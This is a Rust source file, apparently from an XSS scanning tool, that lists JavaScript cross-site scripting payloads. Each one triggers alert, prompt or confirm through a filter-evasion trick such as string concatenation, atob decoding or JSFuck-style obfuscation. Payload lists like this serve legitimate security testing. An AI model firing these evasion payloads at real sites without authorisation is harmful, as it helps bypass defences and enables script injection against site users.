// inHTML, inAttr, ETC
pub const XSS_JAVASCRIPT_PAYLOADS_SMALL: &[&str] = &[
    "alert(1)",                 // alert
    "prompt`1`",                // prompt with backtick
    "confirm(1)",               // confirm
    "(_=prompt,_(1))",          // prompt with bypass technique
    "(((confirm)))``",          // confirm with bypass technique
    "[2].find(alert)",          // alert with bypass technique
    "top[\"al\"+\"\\ert\"](1)", // alert with bypass technique2
    "(()=>alert(1))()",         // arrow function IIFE
    "window?.alert?.(1)",       // optional chaining
    "globalThis.alert(1)",      // globalThis reference
    "self['ale'+'rt'](1)",      // self + string concat
    "Reflect.apply(alert,null,[1])", // Reflect API
];

// for inJS
pub const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
    "alert(1)",                                                         // alert
    "alert`1`",                                                         // alert with backtick
    "prompt(1)",                                                        // prompt
    "prompt`1`",                                                        // prompt with backtick
    "confirm`1`",                                                       // prompt with backtick
    "confirm(1)",                                                       // confirm
    "x=new DOMMatrix;matrix=confirm;x.a=1;location='javascript'+':'+x", // confirm with DOMMatrix
    "this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])", // jsfuck
    "([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()", // jsfuck + hangul
    "([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ア+=ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ア](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()", // jsfuck + katakana
    "(x=>x(1))(alert)",                                                 // arrow callback
    "alert?.(1)??confirm(1)",                                           // nullish coalescing
    "alert.constructor('alert(1)')()",                                   // constructor chain
    "void(alert(1))",                                                   // void operator
    "(0,alert)(1)",                                                     // comma operator
    "Object.values({a:alert})[0](1)",                                   // Object.values bypass
    "window[atob('YWxlcnQ=')](1)",                                      // atob bypass
    "[alert][0].call(null,1)",                                          // array access + call
];
